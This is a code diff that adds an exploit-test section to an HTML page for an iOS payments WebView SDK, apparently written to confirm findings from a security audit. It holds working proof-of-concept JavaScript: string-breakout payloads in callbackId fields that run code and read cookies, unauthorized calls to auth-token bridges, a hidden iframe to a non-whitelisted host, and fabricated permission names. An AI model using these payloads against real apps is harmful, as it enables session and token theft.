@@ -627,5 +627,432 @@ function handleCameraData(cameraData) {
        //  }, 20000);
     });
   </script>
+
+  <!-- ===================== SECURITY EXPLOIT TESTS ===================== -->
+  <hr style="margin: 40px 0; border-color: red;">
+  <h2 style="color: red; text-align: center;">⚠️ Security Exploit Tests</h2>
+  <p style="text-align:center; color:#666; max-width:700px; margin:0 auto 20px;">
+    Each section below maps to a finding in the Security Audit Report.
+    All tests must be run from inside the SDK WebView with this domain whitelisted.
+    Open Safari → Develop → [Device] → [WebView] to observe console output.
+  </p>
+
+  <!-- C-01: Unencrypted Cookie Storage -->
+  <div class="settings-section" style="border-color: red;">
+    <h3 style="color: red;">C-01: Unencrypted Cookie Storage</h3>
+    <p>
+      Creates cookies that the SDK will persist as a plaintext <code>.plist</code> file on disk.<br>
+      <b>After clicking "Create", do:</b> Xcode → Window → Devices → Download Container → AppData/Documents/PhonePeWebView/Cookies/ → open any .plist in TextEdit.
+    </p>
+    <button class="btn" onclick="c01_createSensitiveCookies()">C-01: Create Session &amp; Auth Cookies</button>
+    <button class="btn" onclick="c01_showCookies()">C-01: Show All Cookies</button>
+    <div class="status-box" id="c01Status">—</div>
+  </div>
+
+  <!-- C-02: JS Injection via Incomplete String Escaping -->
+  <div class="settings-section" style="border-color: red;">
+    <h3 style="color: red;">C-02: JS Injection — Backslash &amp; Newline Escape Bypass</h3>
+    <p>
+      Sends a malicious <code>callbackId</code> to the location bridge.<br>
+      The SDK escapes <code>'</code> → <code>\'</code> but NOT <code>\</code>, so a leading backslash
+      cancels the escape and breaks out of the JS string.<br>
+      <b>Confirmation:</b> An <code>alert()</code> popup fires inside the WebView.
+    </p>
+    <p><b>Payload A:</b> <code>\'; alert("C02_INJECTED: "+document.cookie); //</code></p>
+    <p><b>Payload B:</b> raw newline in callbackId breaks the string literal</p>
+    <button class="btn" onclick="c02_backslashInjection()">C-02: Backslash Injection</button>
+    <button class="btn" onclick="c02_newlineInjection()">C-02: Newline Injection</button>
+    <div class="status-box" id="c02Status">—</div>
+  </div>
+
+  <!-- C-03: Custom Bridge Executes Raw JS -->
+  <div class="settings-section" style="border-color: red;">
+    <h3 style="color: red;">C-03: Custom Bridge Executes Raw JavaScript</h3>
+    <p>
+      Sends a crafted <code>callbackId</code> to the <code>CUSTOMTEST</code> bridge.<br>
+      The bridge builds <code>callbackId(response)</code> and executes it verbatim via <code>evaluateJavaScript</code>.<br>
+      <b>Confirmation (Test A):</b> <code>document.title</code> changes to <code>C03_PWNED</code>.<br>
+      <b>Confirmation (Test B):</b> <code>alert()</code> shows real cookie values.
+    </p>
+    <button class="btn" onclick="c03_titleProbe()">C-03: Change document.title</button>
+    <button class="btn" onclick="c03_cookieAlert()">C-03: Alert Cookies via Bridge</button>
+    <div class="status-box" id="c03Status">—</div>
+  </div>
+
+  <!-- C-04: AUTH Bridge Auto-Granted -->
+  <div class="settings-section" style="border-color: red;">
+    <h3 style="color: red;">C-04: AUTH Bridge Auto-Granted to Every Whitelisted Domain</h3>
+    <p>
+      Calls <code>fetchAuthToken</code> and <code>fetchGrantToken</code> directly.<br>
+      Neither is listed in this domain's <code>entityPermissions</code>, but <code>AUTH</code>
+      is in the SDK's hardcoded <code>universalBridge</code> set — so the permission check passes.<br>
+      <b>Confirmation:</b> Any callback fires (even a stub/empty response proves the permission passed).
+    </p>
+    <button class="btn" onclick="c04_fetchAuthToken()">C-04: fetchAuthToken</button>
+    <button class="btn" onclick="c04_fetchGrantToken()">C-04: fetchGrantToken</button>
+    <div class="status-box" id="c04Status">—</div>
+  </div>
+
+  <!-- H-02: Unrestricted iframe Navigation -->
+  <div class="settings-section" style="border-color: orange;">
+    <h3 style="color: orange;">H-02: Unrestricted iframe — Non-Whitelisted Domain Loads</h3>
+    <p>
+      Injects a hidden <code>&lt;iframe&gt;</code> pointing to <code>httpbin.org</code> (not in any whitelist).<br>
+      The SDK's navigation handler returns <code>.allow</code> for all sub-frames before any domain validation.<br>
+      <b>Confirmation:</b> The iframe's <code>onload</code> fires — visible in the status box and Network tab of Web Inspector.
+    </p>
+    <button class="btn" onclick="h02_iframeLoad()">H-02: Inject Non-Whitelisted iframe</button>
+    <div class="status-box" id="h02Status">—</div>
+  </div>
+
+  <!-- H-03: Full GPS Coordinates Exposed -->
+  <div class="settings-section" style="border-color: orange;">
+    <h3 style="color: orange;">H-03: Full GPS Coordinates Exposed to JS</h3>
+    <p>
+      Intercepts the <code>getCurrentLocation</code> callback and logs the raw response.<br>
+      The SDK passes <code>CLLocation.dictionaryRepresentation()</code> directly — full precision, no rounding.<br>
+      <b>Confirmation:</b> Location data in the status box shows 6+ decimal places of precision.
+    </p>
+    <button class="btn" onclick="h03_interceptLocation()">H-03: Intercept Location Callback</button>
+    <div class="status-box" id="h03Status">—</div>
+  </div>
+
+  <!-- H-04: Camera Permission Checks Photos Not Camera -->
+  <div class="settings-section" style="border-color: orange;">
+    <h3 style="color: orange;">H-04: Camera Permission Triggers Photos Dialog (Not Camera)</h3>
+    <p>
+      Calls <code>seekPermission(["CAMERA"])</code> via the SDK bridge.<br>
+      The SDK calls <code>PHPhotoLibrary.authorizationStatus()</code> instead of <code>AVCaptureDevice</code>.<br>
+      <b>Confirmation:</b> iOS shows <em>"Would Like to Access Your Photos"</em> instead of a camera dialog.<br>
+      (Uses the existing SDK method from <code>bundle.js</code>)
+    </p>
+    <button class="btn" onclick="h04_cameraPermission()">H-04: Request CAMERA Permission</button>
+    <div class="status-box" id="h04Status">Watch the iOS system dialog — it should say "Photos" not "Camera".</div>
+  </div>
+
+  <!-- H-06: Full URL with query params sent to analytics -->
+  <div class="settings-section" style="border-color: orange;">
+    <h3 style="color: orange;">H-06: Full URL + Query Params Sent to Analytics</h3>
+    <p>
+      Navigates to the whitelisted domain with a fake <code>token</code> and <code>session</code> in the URL.<br>
+      <code>logPageLoadEvent()</code> passes the full URL (no query stripping) to <code>analyticsProvider.sendEvent</code>.<br>
+      <b>How to confirm:</b> Set a breakpoint at <code>analyticsProvider?.sendEvent(eventType: .pageLoad(url: url))</code>
+      in <code>PhonePeWebViewNavigationDelegate.swift</code> line 259, then click the button.<br>
+      In the debugger run: <code>po url?.absoluteString</code> — the token will be visible.
+    </p>
+    <button class="btn" onclick="h06_navigateWithToken()">H-06: Navigate with Token in URL</button>
+    <div class="status-box" id="h06Status">Set Xcode breakpoint first, then click.</div>
+  </div>
+
+  <!-- H-07: WebRTC Capture Type Ignored -->
+  <div class="settings-section" style="border-color: orange;">
+    <h3 style="color: orange;">H-07: WebRTC Capture Type Ignored — Audio-Only Grants Camera Too</h3>
+    <p>
+      Step 1: Request <b>audio only</b>. Step 2: Request <b>video only</b> without asking.<br>
+      The SDK's <code>decideMediaCapturePermissionsFor</code> ignores the <code>WKMediaCaptureType</code>
+      parameter and returns <code>.grant</code> for everything.<br>
+      <b>Confirmation:</b> Both steps get a live stream with the requested tracks granted.
+    </p>
+    <button class="btn" onclick="h07_audioOnly()">H-07 Step 1: Request Audio Only</button>
+    <button class="btn" onclick="h07_videoOnly()">H-07 Step 2: Request Video Only</button>
+    <div class="status-box" id="h07Status">—</div>
+  </div>
+
+  <!-- H-08: Unknown Permission Names Auto-Approved -->
+  <div class="settings-section" style="border-color: orange;">
+    <h3 style="color: orange;">H-08: Unknown Permission Names Auto-Approved as <code>true</code></h3>
+    <p>
+      Sends completely fabricated permission strings directly via the message handler.<br>
+      The SDK's guard falls through and appends <code>permissionGranted: true</code> for every unknown name.<br>
+      <b>Confirmation:</b> Status box shows all fabricated permissions returned as <code>permissionGranted: true</code>.
+    </p>
+    <button class="btn" onclick="h08_fakePermissions()">H-08: Send Fabricated Permissions</button>
+    <div class="status-box" id="h08Status">—</div>
+  </div>
+
+  <!-- M-03: window.open without user gesture -->
+  <div class="settings-section" style="border-color: #cc9900;">
+    <h3 style="color: #cc9900;">M-03: window.open() Without User Gesture (Already Configured)</h3>
+    <p>
+      <code>javaScriptCanOpenWindowsAutomatically: true</code> is set in your CRISP config.<br>
+      A 2-second delayed <code>window.open()</code> fires with no user interaction.<br>
+      <b>Confirmation:</b> A new WebView window opens automatically. Up to <code>maxWebViewSupported: 2</code> windows allowed.
+    </p>
+    <button class="btn" onclick="m03_autoWindowOpen()">M-03: Auto window.open (2s delay, no gesture)</button>
+    <div class="status-box" id="m03Status">—</div>
+  </div>
+
+  <!-- M-05: TrapURL plain string as regex -->
+  <div class="settings-section" style="border-color: #cc9900;">
+    <h3 style="color: #cc9900;">M-05: TrapURL "www.google.com" is Unescaped Regex — False Positive</h3>
+    <p>
+      Your CRISP config has <code>trapUrls[1] = "www.google.com"</code> — a plain string used as a regex.<br>
+      The dots <code>.</code> match <em>any</em> character, so <code>www-google-com.evil.io</code> also triggers the trap.<br>
+      <b>Confirmation (Test A):</b> The non-google URL triggers <code>onTrapUrlHit</code>.<br>
+      <b>Confirmation (Test B):</b> 10 rapid iframe injections — watch Xcode CPU Navigator for repeated regex compilation spikes.
+    </p>
+    <button class="btn" onclick="m05_falsePositive()">M-05A: Navigate False-Positive Trap URL</button>
+    <button class="btn" onclick="m05_rapidNavigation()">M-05B: Rapid Navigation (CPU Spike)</button>
+    <div class="status-box" id="m05Status">—</div>
+  </div>
+
+  <script>
+    // ── C-01 ──────────────────────────────────────────────────────────────────
+    function c01_createSensitiveCookies() {
+      document.cookie = "session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test; path=/; max-age=86400";
+      document.cookie = "auth_cookie=AUTH_SECRET_VALUE_12345; path=/; max-age=86400";
+      document.cookie = "payment_session=PAY_SESSION_TOKEN_ABC; path=/; max-age=3600";
+      document.cookie = "user_id=U2309121406122578983257; path=/; max-age=86400";
+      document.getElementById('c01Status').textContent =
+        'Cookies created. Now: Xcode → Window → Devices → Download Container → AppData/Documents/PhonePeWebView/Cookies/ → open .plist in TextEdit to see plaintext values.';
+    }
+
+    function c01_showCookies() {
+      var cookies = document.cookie;
+      document.getElementById('c01Status').textContent =
+        cookies ? 'Current cookies:\n' + cookies.split(';').join('\n') : 'No JS-readable cookies found.';
+      if (cookies) alert('C-01 Cookies:\n\n' + cookies.split(';').map(c => c.trim()).join('\n'));
+    }
+
+    // ── C-02 ──────────────────────────────────────────────────────────────────
+    // jsString(for:) in PhonePeWebViewJSEvaluator only escapes ' → \'
+    // A leading \ cancels the escape: \' becomes \\' which is: backslash + end-of-string
+    // The rest of the payload executes as free JavaScript.
+    function c02_backslashInjection() {
+      document.getElementById('c02Status').textContent = 'Sent. Watch for alert() popup — if it fires, C-02 injection is confirmed.';
+      var maliciousCallbackId = "\\'; alert('C02_INJECTED: ' + document.cookie); //";
+      window.webkit.messageHandlers.getCurrentLocation.postMessage({
+        "scriptName": "getCurrentLocation",
+        "callbackId": maliciousCallbackId
+      });
+    }
+
+    function c02_newlineInjection() {
+      document.getElementById('c02Status').textContent = 'Sent. Watch for alert() — if it fires, newline injection is confirmed.';
+      var newlinePayload = "legit_id\n'; alert('C02_NEWLINE_INJECTED'); //";
+      window.webkit.messageHandlers.getCurrentLocation.postMessage({
+        "scriptName": "getCurrentLocation",
+        "callbackId": newlinePayload
+      });
+    }
+
+    // ── C-03 ──────────────────────────────────────────────────────────────────
+    // Custom bridge builds: callbackId(response) and evaluates it verbatim.
+    // Injecting ); code; ( breaks out of the function call.
+    function c03_titleProbe() {
+      window.webkit.messageHandlers.CUSTOMTEST.postMessage({
+        "scriptName": "CUSTOMTEST",
+        "callbackId": "injected); document.title='C03_PWNED'; (",
+        "data": {}
+      });
+      setTimeout(function() {
+        var confirmed = document.title === 'C03_PWNED';
+        document.getElementById('c03Status').textContent = confirmed
+          ? '⚠️ CONFIRMED: document.title changed to "C03_PWNED" — raw JS injection via custom bridge.'
+          : 'Title is "' + document.title + '". Check bridge name matches your CustomBridge registration.';
+      }, 600);
+    }
+
+    function c03_cookieAlert() {
+      window.webkit.messageHandlers.CUSTOMTEST.postMessage({
+        "scriptName": "CUSTOMTEST",
+        "callbackId": "x); alert('C03_COOKIES: ' + document.cookie); (",
+        "data": {}
+      });
+      document.getElementById('c03Status').textContent = 'Sent. If alert fires with cookies, C-03 is confirmed.';
+    }
+
+    // ── C-04 ──────────────────────────────────────────────────────────────────
+    // AUTH is in universalBridge — permission check returns true for every whitelisted domain.
+    // Scripts are currently stubbed (break) so no data returns, but the permission gate passes.
+    // To fully confirm: temporarily un-stub fetchAuthToken in PhonePeWebViewBridgeHandler.swift.
+    function c04_fetchAuthToken() {
+      document.getElementById('c04Status').textContent = 'Sent fetchAuthToken. Any response (even error) = permission check passed = C-04 confirmed.';
+      window.webkit.messageHandlers.fetchAuthToken.postMessage({
+        "scriptName": "fetchAuthToken",
+        "callbackId": "c04_auth_" + Date.now(),
+        "data": {}
+      });
+    }
+
+    function c04_fetchGrantToken() {
+      document.getElementById('c04Status').textContent = 'Sent fetchGrantToken. Any response = C-04 confirmed.';
+      window.webkit.messageHandlers.fetchGrantToken.postMessage({
+        "scriptName": "fetchGrantToken",
+        "callbackId": "c04_grant_" + Date.now(),
+        "data": {}
+      });
+    }
+
+    // ── H-02 ──────────────────────────────────────────────────────────────────
+    // NavigationRequestHandler returns .allow for all sub-frames before any domain check.
+    function h02_iframeLoad() {
+      var f = document.createElement('iframe');
+      f.src = 'https://httpbin.org/get?exploit=H02_iframe_test';
+      f.style.width = '1px';
+      f.style.height = '1px';
+      f.style.position = 'absolute';
+      f.style.opacity = '0';
+      f.onload = function() {
+        document.getElementById('h02Status').textContent =
+          '⚠️ CONFIRMED: iframe to httpbin.org loaded successfully. SDK performed zero sub-frame domain validation.';
+      };
+      f.onerror = function() {
+        document.getElementById('h02Status').textContent = 'iframe blocked or network error (may be mitigated).';
+      };
+      document.body.appendChild(f);
+      document.getElementById('h02Status').textContent = 'iframe injected pointing to httpbin.org (not whitelisted) — waiting for load event...';
+    }
+
+    // ── H-03 ──────────────────────────────────────────────────────────────────
+    // CLLocation.dictionaryRepresentation() returns full precision — no rounding.
+    function h03_interceptLocation() {
+      document.getElementById('h03Status').textContent = 'Intercepting location callback...';
+      // Monkey-patch the callback to log the raw data before passing through
+      if (window.PhonePe && window.PhonePe.MessagingHandler) {
+        var origCb = window.PhonePe.MessagingHandler.callback;
+        window.PhonePe.MessagingHandler.callback = function(id, resolved, data, err) {
+          if (id === 'h03_loc') {
+            var parsed = typeof data === 'string' ? data : JSON.stringify(data);
+            document.getElementById('h03Status').textContent =
+              '⚠️ FULL LOCATION DATA (no rounding): ' + parsed;
+            alert('H-03 Location Data:\n' + parsed);
+            window.PhonePe.MessagingHandler.callback = origCb; // restore
+          }
+          origCb(id, resolved, data, err);
+        };
+      }
+      window.webkit.messageHandlers.getCurrentLocation.postMessage({
+        "scriptName": "getCurrentLocation",
+        "callbackId": "h03_loc"
+      });
+    }
+
+    // ── H-04 ──────────────────────────────────────────────────────────────────
+    // seekCameraPermission() calls PHPhotoLibrary.authorizationStatus() — not camera.
+    function h04_cameraPermission() {
+      document.getElementById('h04Status').textContent = 'Permission dialog triggered. Watch the iOS system dialog — it should say "Photos" not "Camera".';
+      sdk.seekPermission([PhonePe.Constants.Permission.CAMERA]).then(function(data) {
+        document.getElementById('h04Status').textContent =
+          'Response: ' + JSON.stringify(data) + '\nCheck: was it a Photos dialog or a Camera dialog?';
+      }).catch(function(err) {
+        document.getElementById('h04Status').textContent = 'Error: ' + err;
+      });
+    }
+
+    // ── H-06 ──────────────────────────────────────────────────────────────────
+    // logPageLoadEvent() passes raw URL (no query stripping) to analyticsProvider.sendEvent.
+    function h06_navigateWithToken() {
+      document.getElementById('h06Status').textContent =
+        'Navigating. Check Xcode breakpoint at PhonePeWebViewNavigationDelegate.swift:259 — run "po url?.absoluteString" to see token in analytics payload.';
+      window.location.href =
+        'https://mohsin-khan-phonepe.github.io/phonepe-test-site?token=SECRET_TOKEN_EXFIL&session=SESSION_ABC_456&order_id=ORD_789_SENSITIVE';
+    }
+
+    // ── H-07 ──────────────────────────────────────────────────────────────────
+    // decideMediaCapturePermissionsFor ignores WKMediaCaptureType — grants everything.
+    function h07_audioOnly() {
+      navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+        .then(function(stream) {
+          var tracks = stream.getTracks().map(function(t) { return t.kind; }).join(', ');
+          document.getElementById('h07Status').textContent =
+            'Step 1 — Audio-only request → tracks granted: [' + tracks + ']. Now click Step 2.';
+        })
+        .catch(function(e) {
+          document.getElementById('h07Status').textContent = 'Audio denied: ' + e.message;
+        });
+    }
+
+    function h07_videoOnly() {
+      navigator.mediaDevices.getUserMedia({ audio: false, video: true })
+        .then(function(stream) {
+          var tracks = stream.getTracks().map(function(t) { return t.kind; }).join(', ');
+          document.getElementById('h07Status').textContent =
+            '⚠️ CONFIRMED — Step 2 video-only request also granted: [' + tracks + ']. SDK does not check WKMediaCaptureType.';
+        })
+        .catch(function(e) {
+          document.getElementById('h07Status').textContent = 'Video denied (possibly mitigated): ' + e.message;
+        });
+    }
+
+    // ── H-08 ──────────────────────────────────────────────────────────────────
+    // PhonePeWebViewPermissionManager guard: unknown rawValue → approves with permissionGranted: true
+    function h08_fakePermissions() {
+      document.getElementById('h08Status').textContent = 'Sending fabricated permissions...';
+
+      // Intercept the next MessagingHandler callback to capture the response
+      if (window.PhonePe && window.PhonePe.MessagingHandler) {
+        var origCb = window.PhonePe.MessagingHandler.callback;
+        var probeId = 'h08_probe_' + Date.now();
+        window.PhonePe.MessagingHandler.callback = function(id, resolved, data, err) {
+          if (id === probeId) {
+            var parsed = typeof data === 'string' ? data : JSON.stringify(data);
+            document.getElementById('h08Status').textContent =
+              '⚠️ Response for fabricated permissions: ' + parsed +
+              '\nIf all show permissionGranted:true — H-08 confirmed.';
+            alert('H-08 Permission Response:\n' + parsed);
+            window.PhonePe.MessagingHandler.callback = origCb;
+          }
+          origCb(id, resolved, data, err);
+        };
+
+        window.webkit.messageHandlers.seekPermission.postMessage({
+          "scriptName": "seekPermission",
+          "callbackId": probeId,
+          "data": {
+            "permissions": [
+              "IMAGE_FILES",
+              "SUPER_ADMIN_ACCESS",
+              "BYPASS_PAYMENT_GATE",
+              "FREE_PREMIUM"
+            ]
+          }
+        });
+      } else {
+        document.getElementById('h08Status').textContent = 'PhonePe.MessagingHandler not found — SDK may not be initialized yet.';
+      }
+    }
+
+    // ── M-03 ──────────────────────────────────────────────────────────────────
+    // javaScriptCanOpenWindowsAutomatically: true in CRISP config.
+    function m03_autoWindowOpen() {
+      document.getElementById('m03Status').textContent = 'Will call window.open in 2s with no user gesture...';
+      setTimeout(function() {
+        var w = window.open('https://mohsin-khan-phonepe.github.io/phonepe-test-site', '_blank');
+        document.getElementById('m03Status').textContent = w
+          ? '⚠️ CONFIRMED: Auto window.open ALLOWED — new WebView opened without user interaction.'
+          : 'Auto window.open BLOCKED ✅ (javaScriptCanOpenWindowsAutomatically may be false).';
+      }, 2000);
+    }
+
+    // ── M-05 ──────────────────────────────────────────────────────────────────
+    // trapUrls[1] = "www.google.com" — plain string used as NSRegularExpression pattern.
+    // The . matches any char, so www-google-com.evil.io matches and triggers onTrapUrlHit.
+    function m05_falsePositive() {
+      document.getElementById('m05Status').textContent =
+        'Navigating to a URL that is NOT google.com but matches the unescaped regex "www.google.com".\n' +
+        'If SDK fires onTrapUrlHit and cancels navigation — M-05 false positive confirmed.';
+      // The dots in "www.google.com" match any character, so this URL matches the pattern
+      window.location.href = 'https://wwwXgoogleYcom.example.com/m05-test';
+    }
+
+    function m05_rapidNavigation() {
+      document.getElementById('m05Status').textContent =
+        'Injecting 10 iframes rapidly. Watch Xcode Debug Navigator → CPU for spikes caused by repeated NSRegularExpression compilation per navigation.';
+      for (var i = 0; i < 10; i++) {
+        (function(idx) {
+          setTimeout(function() {
+            var f = document.createElement('iframe');
+            // Each iframe navigation causes both trapUrl patterns to be recompiled fresh
+            f.src = 'https://httpbin.org/get?m05_rapid=' + idx;
+            f.style.display = 'none';
+            document.body.appendChild(f);
+          }, idx * 150);
+        })(i);
+      }
+    }
+  </script>
+  <!-- ===================== END SECURITY EXPLOIT TESTS ===================== -->
+
 </body>
 </html>
